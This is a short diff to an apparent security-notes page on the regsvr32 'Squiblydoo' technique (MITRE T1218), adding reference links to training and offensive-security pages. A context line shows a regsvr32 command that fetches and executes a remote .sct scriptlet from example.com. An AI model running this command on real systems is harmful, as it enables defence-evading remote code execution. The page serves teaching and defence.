@@ -36,3 +36,8 @@ c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloa
 The MITRE ATT&CK framework refers to this technique as [Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
 {% endtab %}
 {% endtabs %}
+
+## References
+
+{% embed url="https://tryhackme.com/room/livingofftheland" %}
+{% embed url="https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo" %}
